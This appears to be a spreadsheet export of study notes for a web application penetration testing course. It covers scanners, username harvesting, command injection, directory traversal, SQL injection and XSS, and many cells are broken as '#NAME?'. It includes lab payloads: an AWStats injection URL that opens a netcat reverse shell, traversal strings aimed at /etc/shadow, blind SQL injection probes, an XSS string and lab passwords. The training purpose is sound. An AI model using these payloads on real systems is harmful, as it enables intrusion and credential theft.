",3. Server-Side Disc.,3.1 Scanners,B3P16,,,,,,sec542/3.1/index.htm#s16,,,,
S542-3.1.15,SEC542,,,,,,,,3. Server-Side Disc.,3.1 Scanners,,,,,,,sec542/3.1/index.htm#s15,,,,
S542-3.1.17,SEC542,Grendel Exercise: Select Plug-ins,,,,,,"- Test Module Selection: Select modules
   Keep defaults except: remove Website Mirror and add Comment Lister
- Scan->Start Scan",3. Server-Side Disc.,3.1 Scanners,B3P17,,,,,,sec542/3.1/index.htm#s17,,,,
S542-3.1.20,SEC542,,,,,,,,3. Server-Side Disc.,3.1 Scanners,,,,,,,sec542/3.1/index.htm#s20,,,,
S542-3.1.21,SEC542,Web Application Attack and Audit Framework (w3af),,,,,,#NAME?,3. Server-Side Disc.,3.1 Scanners,B3P21,,,,,,sec542/3.1/index.htm#s21,,,,
S542-3.1.22,SEC542,w3af GUI,,,,,,#NAME?,3. Server-Side Disc.,3.1 Scanners,B3P22,,,,,,sec542/3.1/index.htm#s22,,,,
S542-3.1.23,SEC542,w3af Console,,,,,,#NAME?,3. Server-Side Disc.,3.1 Scanners,B3P23,,,,,,sec542/3.1/index.htm#s23,,,,
S542-3.1.24,SEC542,w3af Scripting,,,,,,#NAME?,3. Server-Side Disc.,3.1 Scanners,B3P24,,,,,,sec542/3.1/index.htm#s24,,,,
S542-3.1.25,SEC542,w3af Discovery Plug-Ins,,,,,,"- Example plug-ins: reports on robots.txt, detect transparent proxy (using TRACE), google spider from Google cache
- Full list: ??fingerPKS, phpinfo, yahooSiteExplorer, wordpressfingerprint, pykto, allowedMethods, wsdlFinder, findCaptchas, dirbruter, frontpageversion, digitSum, halberd, importResults, faviconidentification, dnsWildcard, detectTransparentProxy, riaenumerator, fingerprintos, afd, spiderMan, dotNetErrors, sharedHosting, googleSpider, ghdb, webSpider, wordnet, serverHeader, slash, domaindot, fingerGoogle, fingerMSN, findBackdoor, zoneh, googleSets, sitemapReader, fingerprintWAF, urlFuzzer, detectReverseProxy, serverStatus, hmap, webDiff, oracleDiscovery, contentnegotiation, xssedDotCom, findvhost, phpEggs, robotsReader, archiveDotOrg, userDir, phishtank, xml, MSNSpider",3. Server-Side Disc.,3.1 Scanners,B3P25,,,,,,sec542/3.1/index.htm#s25,,,,
S542-3.1.19,SEC542,Grendel Exercise: View Results,,,,,,#NAME?,3. Server-Side Disc.,3.1 Scanners,B3P19,,,,,,sec542/3.1/index.htm#s19,,,,
S542-3.1.18,SEC542,Grendel Exercise: Use the Browser,,,,,,#NAME?,3. Server-Side Disc.,3.1 Scanners,B3P18,,,,,,sec542/3.1/index.htm#s18,,,,
S542-3.1.26,SEC542,w3af Evasion Plug-Ins,,,,,,"- Evades WAF, mod_security (built-in)
- hex encoding, ref dirs (./cgi-bin/./script.pl, case changes (case-insensitive sites)
 - Full list: ?fullWidthEncode, modsecurity, rndCase, reversedSlashes, selfReference, rndPath, rndHexEncode, backSpaceBetweenDots, rndParam, shiftOutShiftInBetweenDots",3. Server-Side Disc.,3.1 Scanners,B3P26,,,,,,sec542/3.1/index.htm#s26,,,,
S542-3.1.27,SEC542,w3af Audit Plugins,,,,,,"- Maps to our Discovery phase
- Tries to find XSS, SQL Injection, Response Splitting
- Build from Information Gathering
- Example audit plugins: sslCertificate (issues), unSSL, osCommanding (cmd injection)
- Full list: ?frontpage, eval, blindSqli, phishingVector, xss, xsrf, mxInjection, pregreplace, htaccessMethods, LDAPi, unSSL, sslCertificate, osCommanding, ssi, sqli, buffOverflow, redos, xpath, generic, localFileInclude, remoteFileInclude, responseSplitting, dav, formatString, globalRedirect, xst, fileUpload",3. Server-Side Disc.,3.1 Scanners,B3P27,,,,,,sec542/3.1/index.htm#s27,,,,
S542-3.1.28,SEC542,w3af Grep Plug-Ins,,,,,,"- Examples of grep plug-ins: path discosure, code, AJAX, E-mail addresses, site language
- Full list: ?motw, creditCards, feeds, newline, pathDisclosure, hashFind, strangeHeaders, dotNetEventValidation, directoryIndexing, collectCookies, getMails, oracle, strangeHTTPCode, httpInBody, fileUpload, ajax, error, errorPages, objects, metaTags, domXss, wsdlGreper, httpAuthDetect, svnUsers, passwordProfiling, blankBody, lang, strangeParameters, findComments, ssn, codeDisclosure, privateIP",3. Server-Side Disc.,3.1 Scanners,B3P28,,,,,,sec542/3.1/index.htm#s28,,,,
S542-3.1.29,SEC542,w3af Brute Force Plug-Ins,,,,,,"- Basic or Forms authentication bruteforcing
- Grab email as usernames, use all words on site as password dictionary
- Added NTML Bruteforcing (to Forms-based and Basic auth)",3. Server-Side Disc.,3.1 Scanners,B3P29,,,,,,sec542/3.1/index.htm#s29,,,,
S542-3.1.30,SEC542,w3af: Running,,,,,,"1. Enter URL
2. Create profile, select plug-ins and output (console, gtkOutput, html, text, xml)
3. Press Start",3. Server-Side Disc.,3.1 Scanners,B3P30,,,,,,sec542/3.1/index.htm#s30,,,,
S542-3.1.33,SEC542,,,,,,,,3. Server-Side Disc.,3.1 Scanners,,,,,,,sec542/3.1/index.htm#s33,,,,
S542-3.1.31,SEC542,w3af Results,,,,,,#NAME?,3. Server-Side Disc.,3.1 Scanners,B3P31,,,,,,sec542/3.1/index.htm#s31,,,,
S542-3.1.32,SEC542,w3af Exploitation,,,,,,#NAME?,3. Server-Side Disc.,3.1 Scanners,B3P32,,,,,,sec542/3.1/index.htm#s32,,,,
S542-3.1.34,SEC542,,,,,,,,3. Server-Side Disc.,3.1 Scanners,,,,,,,sec542/3.1/index.htm#s34,,,,
S542-3.1.37,SEC542,w3af Exercise: osCommanding Shell,,,,,,"- In Exploit tab, right-clign osCommandingShell and select ""Exploit all until 1st success)
- Double-click on th eshell in the Shells window",3. Server-Side Disc.,3.1 Scanners,B3P37,,,,,,sec542/3.1/index.htm#s37,,,,
S542-3.1.38,SEC542,w3af Exercise: Use the Shell,,,,,,#NAME?,3. Server-Side Disc.,3.1 Scanners,B3P38,,,,,,sec542/3.1/index.htm#s38,,,,
S542-2.2.33,SEC542,,,,,,,,2. Recon & Mapping,2.2 Mapping,,,,,,,sec542/2.2/index.htm#s33,,,,
S542-3.1.40,SEC542,,,,,,,,3. Server-Side Disc.,3.1 Scanners,,,,,,,sec542/3.1/index.htm#s40,,,,
S542-3.1.41,SEC542,Burp Suite,,,,,,"- http://portswigger.net
- Mosty manual
- A collection of tools
- Allows a lower level interaction with requests & responses
- Requires deeper knowledge of HTTP
- Free and commercial version (~200$)
- Commercial: save state, Burp Intruder without throttling and better set of attack strings, 1.2 has entire automated scanner, also passive scanning of flaws",3. Server-Side Disc.,3.1 Scanners,B3P41,,,,,,sec542/3.1/index.htm#s41,,,,
S542-3.1.42,SEC542,Burp Suite Components,,,,,,#NAME?,3. Server-Side Disc.,3.1 Scanners,B3P42,,,,,,sec542/3.1/index.htm#s42,,,,
S542-3.1.35,SEC542,w3af Exercise: Launch the GUI,,,,,,"- /usr/bin/samurai/w3af$ ./w3af_gui
- In targets, enter https://www.sec542.org/scanners",3. Server-Side Disc.,3.1 Scanners,B3P35,,,,,,sec542/3.1/index.htm#s35,,,,
S542-3.1.36,SEC542,w3af Exercise: Configure the scan,,,,,,#NAME?,3. Server-Side Disc.,3.1 Scanners,B3P36,,,,,,sec542/3.1/index.htm#s36,,,,
S542-3.1.39,SEC542,w3af Exercise: Examine the Results,,,,,,#NAME?,3. Server-Side Disc.,3.1 Scanners,B3P39,,,,,,sec542/3.1/index.htm#s39,,,,
S542-3.1.46,SEC542,Burp Repeater,,,,,,#NAME?,3. Server-Side Disc.,3.1 Scanners,B3P46,,,,,,sec542/3.1/index.htm#s46,,,,
S542-3.1.44,SEC542,Burp Spider,,,,,,#NAME?,3. Server-Side Disc.,3.1 Scanners,B3P44,,,,,,sec542/3.1/index.htm#s44,,,,
S542-3.1.43,SEC542,Burp Proxy,,,,,,"- Interception control
- Feeds the rest of the tools
- Has fine-grained rules for request/response interception
- Can automatically rewrite HTML (removing client side filtering",3. Server-Side Disc.,3.1 Scanners,B3P43,,,,,,sec542/3.1/index.htm#s43,,,,
S542-3.1.45,SEC542,Burp Intruder,,,,,,#NAME?,3. Server-Side Disc.,3.1 Scanners,B3P45,,,,,,sec542/3.1/index.htm#s45,,,,
S542-3.1.47,SEC542,Burp Sequencer,,,,,,"- To analyze the session tokens
- Large number of tests to determine the randomness
- Runs FIPS 140-2 tests
- Excellent descriptoins",3. Server-Side Disc.,3.1 Scanners,B3P47,,,,,,sec542/3.1/index.htm#s47,,,,
S542-3.1.51,SEC542,,,,,,,,3. Server-Side Disc.,3.1 Scanners,,,,,,,sec542/3.1/index.htm#s51,,,,
S542-3.1.52,SEC542,Burp Exercise: Launching,,,,,,- /usr/bin/samurai/burpsuite_v1.2$ java -jar burpsuite_v1.2.jar,3. Server-Side Disc.,3.1 Scanners,B3P52,,,,,,sec542/3.1/index.htm#s52,,,,
S542-3.1.49,SEC542,Burp Comparer,,,,,,#NAME?,3. Server-Side Disc.,3.1 Scanners,B3P49,,,,,,sec542/3.1/index.htm#s49,,,,
S542-3.1.53,SEC542,Burp Exercise: Configure Firefox,,,,,,#NAME?,3. Server-Side Disc.,3.1 Scanners,B3P53,,,,,,sec542/3.1/index.htm#s53,,,,
S542-3.1.54,SEC542,Burp Exercise: Access a Web Site,,,,,,#NAME?,3. Server-Side Disc.,3.1 Scanners,B3P54,,,,,,sec542/3.1/index.htm#s54,,,,
S542-3.1.55,SEC542,Burp Exercise: Intruder,,,,,,"- In Burp, select form_auth request in Target tab and ""send to intruder""
- Check that payload positions are OK for username and password 
- Switch to payload tab, set paylod to Bruteforcer and click Start (under Intruder)",3. Server-Side Disc.,3.1 Scanners,B3P55,,,,,,sec542/3.1/index.htm#s55,,,,
S542-3.1.56,SEC542,Burp Exercise: Review Results,,,,,,#NAME?,3. Server-Side Disc.,3.1 Scanners,B3P56,,,,,,sec542/3.1/index.htm#s56,,,,
S542-3.1.48,SEC542,Burp Decoder,,,,,,#NAME?,3. Server-Side Disc.,3.1 Scanners,B3P48,,,,,,sec542/3.1/index.htm#s48,,,,
S542-3.1.50,SEC542,,,,,,,,3. Server-Side Disc.,3.1 Scanners,,,,,,,sec542/3.1/index.htm#s50,,,,
S542-3.1.57,SEC542,,,,,,,,3. Server-Side Disc.,3.1 Scanners,,,,,,,sec542/3.1/index.htm#s57,,,,
S542-3.1.58,SEC542,Samurai LiveCD,,,,,,- http://samurai.inguardians.com,3. Server-Side Disc.,3.1 Scanners,B3P58,,,,,,sec542/3.1/index.htm#s58,,,,
S542-3.1.59,SEC542,Samurai WTF Desktop,,,,,,"- Ships with MoinMoin wiki, Burp, Paros, WebScarab, nmap, webshag, sqlmap, Grendel-Scan, w3af
- /usr/bin/samurai (most of them)",3. Server-Side Disc.,3.1 Scanners,B3P59,,,,,,sec542/3.1/index.htm#s59,,,,
S542-3.1.60,SEC542,On the Samurai DVD,,,,,,,3. Server-Side Disc.,3.1 Scanners,B3P60,,,,,,sec542/3.1/index.htm#s60,,,,
S542-3.2.01,SEC542,Manual Verif. Techniques: Section Objectives,,,,,,"Test for common web application vulnerabilities using a combination of manual techniques and tools as well as Directory Browsing , Username Harvesting, Command Injection, Directory Traversal, SQL Injection (fingerprinting, commands, discovery, Basics of TamperData, SQLMap), Blind SQL Injection (discovery, timing, Basics of ABSinthe and SQLMap, Cross Site Scripting (discovery, bypassing filters, types, discovery tools and their uses as well as Cross Site request forgery.",3. Server-Side Disc.,3.2 Manual Verif.,B3P61,,,,,,sec542/3.2/index.htm#s1,,,,
S542-3.2.02,SEC542,Understading Web App Vulnerability Types,,,,,,"- Now we need to understand in depth the vulnerabilities discovered
- Reduce false positives, understand the risks
- Make report more accurate & actionable
- Leads to the exploitation phase",3. Server-Side Disc.,3.2 Manual Verif.,B3P62,,,,,,sec542/3.2/index.htm#s2,,,,
S542-3.2.03,SEC542,,,,,,,,3. Server-Side Disc.,3.2 Manual Verif.,,,,,,,sec542/3.2/index.htm#s3,,,,
S542-3.2.04,SEC542,Information Leakage,,,,,,#NAME?,3. Server-Side Disc.,3.2 Manual Verif.,B3P64,,,,,,sec542/3.2/index.htm#s4,,,,
S542-3.2.06,SEC542,Google Searching of Directory Browsing,,,,,,"- Search for: intitle:""Index of"" ""Last Modified"" site:DOMAIN",3. Server-Side Disc.,3.2 Manual Verif.,B3P66,,,,,,sec542/3.2/index.htm#s6,,,,
S542-3.2.07,SEC542,Manual Discovery of Directory Browsing,,,,,,"- eg: http://www.DOMAIN.com/app/admin/index.php
- Use application map and test directories
- Remember 403 means Forbidden",3. Server-Side Disc.,3.2 Manual Verif.,B3P67,,,,,,sec542/3.2/index.htm#s7,,,,
S542-3.2.10,SEC542,,,,,,,,3. Server-Side Disc.,3.2 Manual Verif.,,,,,,,sec542/3.2/index.htm#s10,,,,
S542-3.2.12,SEC542,Directory Browsing Exercise: User Directories,,,,,,"- On sec542 VM, copy phpinfo.php to ~/public_html/, ln  -s /etc gift
- On samurai VM, browsee to www.sec542.org/�sec542",3. Server-Side Disc.,3.2 Manual Verif.,B3P72,,,,,,sec542/3.2/index.htm#s12,,,,
S542-3.2.13,SEC542,,,,,,,,3. Server-Side Disc.,3.2 Manual Verif.,,,,,,,sec542/3.2/index.htm#s13,,,,
S542-3.2.11,SEC542,Directory Browsing Exercise: Running find_accounts,,,,,,"- /usr/local/bin/find_accounts to look for http://URL/~username  (Apache feature):
?  ./find_accounts < lastnames.txt 
  Found: bgates : (http://www.sec542.org/~bgates)
  Found: bolson : (http://www.sec542.org/~bolson)
  Found: djohnson : (http://www.sec542.org/~djohnson",3. Server-Side Disc.,3.2 Manual Verif.,B3P71,,,,,,sec542/3.2/index.htm#s11,,,,
S542-3.2.14,SEC542,Username Harvesting,,,,,,"- Using error messages, find existing usernames
- It's a problem, it's 50% of the info needed to login and it can lead to reputational problems (spamming)",3. Server-Side Disc.,3.2 Manual Verif.,B3P74,,,,,,sec542/3.2/index.htm#s14,,,,
S542-3.2.05,SEC542,Directory Browsing,,,,,,"- Feature of web server
- Reveal more than intended (config or include files)
- Discoverable via several methods: Google, Manually, Auto.
- Google search for: ""Index of"" site:SITENAME",3. Server-Side Disc.,3.2 Manual Verif.,B3P65,,,,,,sec542/3.2/index.htm#s5,,,,
S542-3.2.15,SEC542,Username Harvesting Login Error Msgs,,,Username harvesting,,0,"- Error ""Bad Username"", ""Incorrect Password""",3. Server-Side Disc.,3.2 Manual Verif.,B3P75,,,,,,sec542/3.2/index.htm#s15,203,,,
S542-3.2.18,SEC542,Harvesting Areas,,,,,,#NAME?,3. Server-Side Disc.,3.2 Manual Verif.,B3P78,,,,,,sec542/3.2/index.htm#s18,,,,
S542-3.2.16,SEC542,Username Harvesting through URL-based Errors,,,,,,"- login.php?error=1 (wrong username)
- login.php?error=2 (incorrect password)",3. Server-Side Disc.,3.2 Manual Verif.,B3P76,,,,,,sec542/3.2/index.htm#s16,,,,
S542-3.2.08,SEC542,Automated Discovery of Dir. Browsing,,,,,,"- Previous scanning tools (nikto, grendel, DirBuster) search for dir. browsing
- Done via spidering and bruteforcing (with common names/strings)
- Here we do the same but manually",3. Server-Side Disc.,3.2 Manual Verif.,B3P68,,,,,,sec542/3.2/index.htm#s8,,,,
S542-3.2.17,SEC542,Other Issues that Cause Username Harvesting,,,,,,#NAME?,3. Server-Side Disc.,3.2 Manual Verif.,B3P77,,,,,,sec542/3.2/index.htm#s17,,,,
S542-3.2.22,SEC542,,,,,,,,3. Server-Side Disc.,3.2 Manual Verif.,,,,,,,sec542/3.2/index.htm#s22,,,,
S542-3.2.23,SEC542,Username Harvesting Exercise: Testing a Login Form,,,,,,#NAME?,3. Server-Side Disc.,3.2 Manual Verif.,B3P83,,,,,,sec542/3.2/index.htm#s23,,,,
S542-3.2.24,SEC542,Username Harvesting Exercise: Enumerating Users,,,,,,"- Run script user_enum (uses login form)
?$ ./user_enum < lastnames.txt 
bgates
bolson
djohnson
",3. Server-Side Disc.,3.2 Manual Verif.,B3P84,,,,,,sec542/3.2/index.htm#s24,,,,
S542-3.2.25,SEC542,,,,,,,,3. Server-Side Disc.,3.2 Manual Verif.,,,,,,,sec542/3.2/index.htm#s25,,,,
S542-3.2.26,SEC542,,,,,,,,3. Server-Side Disc.,3.2 Manual Verif.,,,,,,,sec542/3.2/index.htm#s26,,,,
S542-3.2.27,SEC542,Command Injection,,,,,,"- Less common in moderm apps
- Allows to input OS commands through the web app
- Runs as web server priv.
- 2 types of results: local results, remote results",3. Server-Side Disc.,3.2 Manual Verif.,B3P87,,,,,,sec542/3.2/index.htm#s27,,,,
S542-3.2.28,SEC542,Command Injection Results,,,,,,"- Add ""; ls /etc""
- Often, blind command injection
- Solution: ping MYDOMAIN (check that traffic is coming in)",3. Server-Side Disc.,3.2 Manual Verif.,B3P88,,,,,,sec542/3.2/index.htm#s28,,,,
S542-3.2.29,SEC542,,,,,,,,3. Server-Side Disc.,3.2 Manual Verif.,,,,,,,sec542/3.2/index.htm#s29,,,,
S542-3.2.30,SEC542,,,,,,,,3. Server-Side Disc.,3.2 Manual Verif.,,,,,,,sec542/3.2/index.htm#s30,,,,
S542-3.2.31,SEC542,Command Injection Exercise: Code Inspection,,,,,,"- With perl, open(""|..."") allows execution (injecting a pipe before the filename)",3. Server-Side Disc.,3.2 Manual Verif.,B3P91,,,,,,sec542/3.2/index.htm#s31,,,,
S542-3.2.32,SEC542,Command Injection Exercise: Exploiting AWStats,,,,,,"- Use the URL:
?http://www.sec542.org/awstats/awstats.pl?&PluginMode=:print+system('nc+192.168.1.40+3000+-e+/bin/sh')+;",3. Server-Side Disc.,3.2 Manual Verif.,B3P92,,,,,,sec542/3.2/index.htm#s32,,,,
S542-3.2.33,SEC542,,,,,,,,3. Server-Side Disc.,3.2 Manual Verif.,,,,,,,sec542/3.2/index.htm#s33,,,,
S542-3.2.20,SEC542,Collecting Potential Passwords,,,,,,"- Many users use simple passwords
- Number of sources: dictionary online, wordlists, output from John the Ripper's mangle function
- Spidering a web site using CeWL (dijininja.org)
",3. Server-Side Disc.,3.2 Manual Verif.,B3P80,,,,,,sec542/3.2/index.htm#s20,,,,
S542-3.2.19,SEC542,Testing Methods to Discover Username Harvesting,,,,,,#NAME?,3. Server-Side Disc.,3.2 Manual Verif.,B3P79,,,,,,sec542/3.2/index.htm#s19,,,,
S542-3.2.21,SEC542,,,,,,,,3. Server-Side Disc.,3.2 Manual Verif.,,,,,,,sec542/3.2/index.htm#s21,,,,
S542-3.2.34,SEC542,Directory Traversal,,,,,,"- Provides the ability to leave the web root (old vulnerability)
- ../../../../../etc/shadow
- Encoding / in unicode
- C:\Windows",3. Server-Side Disc.,3.2 Manual Verif.,B3P94,,,,,,sec542/3.2/index.htm#s34,,,,
S542-3.2.38,SEC542,Obvious Parameters,,,,,,"- /etc/passwd, /global.asa (IIS)
- \docume~1\kjohnson\mydocu~1 (Windows 8.3 notation)
- \winnt\system32\cmd.exe
- /var/www, webroot of Apache
- /home/username/public_html",3. Server-Side Disc.,3.2 Manual Verif.,B3P98,,,,,,sec542/3.2/index.htm#s38,,,,
S542-3.2.39,SEC542,Building Blocks,,,,,,"- Terminate parameter wth NULL ""%00"" (/etc/passwd%00)
- ../../template../../../etc/passwd%00.php
- Instead of config, enter ../../index.php  (retrieve source code)",3. Server-Side Disc.,3.2 Manual Verif.,B3P99,,,,,,sec542/3.2/index.htm#s39,,,,
S542-3.2.36,SEC542,Application Example,,,,,,"- http://vulnsite/index.php?templ=../include/siteconfig.inc
- Change to templ=/etc/passwd...
- Developers are under time pressures...",3. Server-Side Disc.,3.2 Manual Verif.,B3P96,,,,,,sec542/3.2/index.htm#s36,,,,
S542-3.2.35,SEC542,Traditional Example,,,,,,"- http://vulnsite/scripts/../../../winnt/system32/cmd.exe+/c+dir
- Same problem on Apache
- Put up a WAF...",3. Server-Side Disc.,3.2 Manual Verif.,B3P95,,,,,,sec542/3.2/index.htm#s35,,,,
S542-3.2.37,SEC542,Testing for Directory Traversal,,,,,,"- Parameters may be obvious config=../../includes/config.php
- config=side, and then: ../../includes/${config}.php",3. Server-Side Disc.,3.2 Manual Verif.,B3P97,,,,,,sec542/3.2/index.htm#s37,,,,
S542-3.2.42,SEC542,SQL Injection Causes,,,,,,#NAME?,3. Server-Side Disc.,3.2 Manual Verif.,B3P102,,,,,,sec542/3.2/index.htm#s42,,,,
S542-3.2.44,SEC542,Fingerprinting the DB,,,,,,#NAME?,3. Server-Side Disc.,3.2 Manual Verif.,B3P104,,,,,,sec542/3.2/index.htm#s44,,,,
S542-3.2.41,SEC542,SQL Injection,,,,,,#NAME?,3. Server-Side Disc.,3.2 Manual Verif.,B3P101,,,,,,sec542/3.2/index.htm#s41,,,,
S542-3.2.43,SEC542,SQL Injection Discovery,,,,,,"- Look for input points (forms, cookies, headers and other inputs)
- Enter a '
- If the application errors, it may be vulnerable",3. Server-Side Disc.,3.2 Manual Verif.,B3P103,,,,,,sec542/3.2/index.htm#s43,,,,
S542-3.2.40,SEC542,SQL Injection,,,,,,#NAME?,3. Server-Side Disc.,3.2 Manual Verif.,B3P100,,,,,,sec542/3.2/index.htm#s40,,,,
S542-3.2.45,SEC542,SQL Errors,,,,,,"- ORA-01756: quoted string not properly terminated
- MSSQL: Incorrect Syntax near '
- MySQL: you have an error in your SQL syntax",3. Server-Side Disc.,3.2 Manual Verif.,B3P105,,,,,,sec542/3.2/index.htm#s45,,,,
S542-3.2.49,SEC542,SQL Injection: Discovery,,,,,,#NAME?,3. Server-Side Disc.,3.2 Manual Verif.,B3P109,,,,,,sec542/3.2/index.htm#s49,,,,
S542-3.2.47,SEC542,Fingerprinting the DB: Control Tables,,,,,,#NAME?,3. Server-Side Disc.,3.2 Manual Verif.,B3P107,,,,,,sec542/3.2/index.htm#s47,,,,
S542-3.2.46,SEC542,Fingerprinting the DB: Year Syntax,,,,,,#NAME?,3. Server-Side Disc.,3.2 Manual Verif.,B3P106,,,,,,sec542/3.2/index.htm#s46,,,,
S542-3.2.52,SEC542,Tampering with a Request,,,,,,#NAME?,3. Server-Side Disc.,3.2 Manual Verif.,B3P112,,,,,,sec542/3.2/index.htm#s52,,,,
S542-3.2.53,SEC542,Fuzzing,,,,,,#NAME?,3. Server-Side Disc.,3.2 Manual Verif.,B3P113,,,,,,sec542/3.2/index.htm#s53,,,,
S542-3.2.54,SEC542,SQL Inject Me,,,,,,"- Newer versions are better
- Not the best but it's nice anyway
- Firefox extension
- Hi false-positives and false-negatives",3. Server-Side Disc.,3.2 Manual Verif.,B3P114,,,,,,sec542/3.2/index.htm#s54,,,,
S542-3.2.55,SEC542,After Fuzzing,,,,,,"- Look for 500 status codes
- Record results (request, params, input that caused errors)",3. Server-Side Disc.,3.2 Manual Verif.,B3P115,,,,,,sec542/3.2/index.htm#s55,,,,
S542-3.2.56,SEC542,,,,,,,,3. Server-Side Disc.,3.2 Manual Verif.,,,,,,,sec542/3.2/index.htm#s56,,,,
S542-3.2.57,SEC542,,,,,,,,3. Server-Side Disc.,3.2 Manual Verif.,,,,,,,sec542/3.2/index.htm#s57,,,,
S542-3.2.58,SEC542,SQL Injection Exercise: SQL Inject Me,,,,,,"- Use bookmark ""SQL Inject  Me"" (exercise)
- Tools->SQL Inject Me. Click Open SQL Inject Me Sidebar. Click Test all forms with all attacks.",3. Server-Side Disc.,3.2 Manual Verif.,B3P118,,,,,,sec542/3.2/index.htm#s58,,,,
S542-3.2.59,SEC542,,,,,,,,3. Server-Side Disc.,3.2 Manual Verif.,,,,,,,sec542/3.2/index.htm#s59,,,,
S542-3.2.60,SEC542,,,,,,,,3. Server-Side Disc.,3.2 Manual Verif.,,,,,,,sec542/3.2/index.htm#s60,,,,
S542-3.2.61,SEC542,Blind SQL Injection,,,,,,#NAME?,3. Server-Side Disc.,3.2 Manual Verif.,B3P121,,,,,,sec542/3.2/index.htm#s61,,,,
S542-3.2.62,SEC542,Blind SQL Injection Discovery,,,,,,"- Look for boolean behaviour in application
  index.php?itemid=9   (returns data for item 9)
  index.php?itemid='   (returns a no item found result)
  index.php?itemid=9' and 1=1;--   (returns data for item 9)
  index.php?itemid=9' and 1=0;--   (returns a no item found result)
",3. Server-Side Disc.,3.2 Manual Verif.,B3P122,,,,,,sec542/3.2/index.htm#s62,,,,
S542-3.2.63,SEC542,20 Questions (blind SQL injection),,,,,,#NAME?,3. Server-Side Disc.,3.2 Manual Verif.,B3P123,,,,,,sec542/3.2/index.htm#s63,,,,
S542-3.2.48,SEC542,SQL Injection: Important Commands,,,,,,#NAME?,3. Server-Side Disc.,3.2 Manual Verif.,B3P108,,,,,,sec542/3.2/index.htm#s48,,,,
S542-3.2.65,SEC542,SQL Injection Tools,,,,,,-,3. Server-Side Disc.,3.2 Manual Verif.,B3P125,,,,,,sec542/3.2/index.htm#s65,,,,
S542-3.2.66,SEC542,Absinthe,,,,,,#NAME?,3. Server-Side Disc.,3.2 Manual Verif.,B3P126,,,,,,sec542/3.2/index.htm#s66,,,,
S542-3.2.50,SEC542,SQL Injection: Manual Discovery,,,,,,#NAME?,3. Server-Side Disc.,3.2 Manual Verif.,B3P110,,,,,,sec542/3.2/index.htm#s50,,,,
S542-3.2.64,SEC542,Blind SQL using Timing,,,,,,#NAME?,3. Server-Side Disc.,3.2 Manual Verif.,B3P124,,,,,,sec542/3.2/index.htm#s64,,,,
S542-3.2.51,SEC542,TamperData,,,,,,#NAME?,3. Server-Side Disc.,3.2 Manual Verif.,B3P111,,,,,,sec542/3.2/index.htm#s51,,,,
S542-3.2.67,SEC542,Absinthe in Use,,,,,,#NAME?,3. Server-Side Disc.,3.2 Manual Verif.,B3P127,,,,,,sec542/3.2/index.htm#s67,,,,
S542-3.2.68,SEC542,Absinthe: Retrieving DB Schema and Data,,,,,,,3. Server-Side Disc.,3.2 Manual Verif.,B3P128,,,,,,sec542/3.2/index.htm#s68,,,,
S542-3.2.69,SEC542,sqlmap,,,,,,#NAME?,3. Server-Side Disc.,3.2 Manual Verif.,B3P129,,,,,,sec542/3.2/index.htm#s69,,,,
S542-3.2.70,SEC542,sqlmap Features,,,,,,"- Normal (in-band) and Blind SQL Injection
- Google searches to find sQL errors indexed and cached 
- Can import target URLs from Burp and WebScarab
_Variety of useful prebuilt attacks, OS shell, encoding files...",3. Server-Side Disc.,3.2 Manual Verif.,B3P130,,,,,,sec542/3.2/index.htm#s70,,,,
S542-3.2.71,SEC542,,,,,,,,3. Server-Side Disc.,3.2 Manual Verif.,,,,,,,sec542/3.2/index.htm#s71,,,,
S542-3.2.75,SEC542,Filtering,,,,,,#NAME?,3. Server-Side Disc.,3.2 Manual Verif.,B3P135,,,,,,sec542/3.2/index.htm#s75,,,,
S542-3.2.76,SEC542,Bypassing Filters,,,,,,"- Many ways. Use VBScript. Scripting withing tags w/o <script>
- See cheat sheet on http://ha.ckers.org/xss.html",3. Server-Side Disc.,3.2 Manual Verif.,B3P136,,,,,,sec542/3.2/index.htm#s76,,,,
S542-3.2.77,SEC542,Types of XSS,,,,,,#NAME?,3. Server-Side Disc.,3.2 Manual Verif.,B3P137,,,,,,sec542/3.2/index.htm#s77,,,,
S542-3.2.78,SEC542,Persistent (Admin),,,,,,"- Sub-type of the persistent flaw
- Admin users review content before posting and approving
- Using the admin's privilege to execute (forum comment moderation)",3. Server-Side Disc.,3.2 Manual Verif.,B3P138,,,,,,sec542/3.2/index.htm#s78,,,,
S542-3.2.79,SEC542,Tools for Discovery XSS Flaws,,,,,,#NAME?,3. Server-Side Disc.,3.2 Manual Verif.,B3P139,,,,,,sec542/3.2/index.htm#s79,,,,
S542-3.2.80,SEC542,Web Developer Extension,,,,,,"- Outline external links.., view generated source, manage cookies
- Disable java/javascript..., referrers, colors...
- Validate HTML, CSS, section 508, links...",3. Server-Side Disc.,3.2 Manual Verif.,B3P140,,,,,,sec542/3.2/index.htm#s80,,,,
S542-3.2.72,SEC542,Cross Site Scripting,,,,,,#NAME?,3. Server-Side Disc.,3.2 Manual Verif.,B3P132,,,,,,sec542/3.2/index.htm#s72,,,,
S542-3.2.82,SEC542,Live HTTP Headers Extension,,,,,,#NAME?,3. Server-Side Disc.,3.2 Manual Verif.,B3P142,,,,,,sec542/3.2/index.htm#s82,,,,
S542-3.2.83,SEC542,TamperData,,,,,,#NAME?,3. Server-Side Disc.,3.2 Manual Verif.,B3P143,,,,,,sec542/3.2/index.htm#s83,,,,
S542-3.2.84,SEC542,XSS Me Extension,,,,,,#NAME?,3. Server-Side Disc.,3.2 Manual Verif.,B3P144,,,,,,sec542/3.2/index.htm#s84,,,,
S542-3.2.85,SEC542,GreaseMonkey,,,,,,#NAME?,3. Server-Side Disc.,3.2 Manual Verif.,B3P145,,,,,,sec542/3.2/index.htm#s85,,,,
S542-3.2.86,SEC542,PostInterpreter,,,,,,#NAME?,3. Server-Side Disc.,3.2 Manual Verif.,B3P146,,,,,,sec542/3.2/index.htm#s86,,,,
S542-3.2.74,SEC542,Discovering XSS,,,,,,#NAME?,3. Server-Side Disc.,3.2 Manual Verif.,B3P134,,,,,,sec542/3.2/index.htm#s74,,,,
S542-3.2.88,SEC542,,,,,,,,3. Server-Side Disc.,3.2 Manual Verif.,,,,,,,sec542/3.2/index.htm#s88,,,,
S542-3.2.89,SEC542,,,,,,,,3. Server-Side Disc.,3.2 Manual Verif.,,,,,,,sec542/3.2/index.htm#s89,,,,
S542-3.2.90,SEC542,XSS Scripting Exercise: Reflective XSS,,,,,,"- Go  to phpmyadmin and inject: index.php?lang=<script>alert('XSS!')</script>
- Passwords: root/MySQLUSER, snort/mypassword",3. Server-Side Disc.,3.2 Manual Verif.,B3P150,,,,,,sec542/3.2/index.htm#s90,,,,
S542-3.2.81,SEC542,Web Developer Functions,,,,,,"- Convert form method (change method the forms use (method interchange)
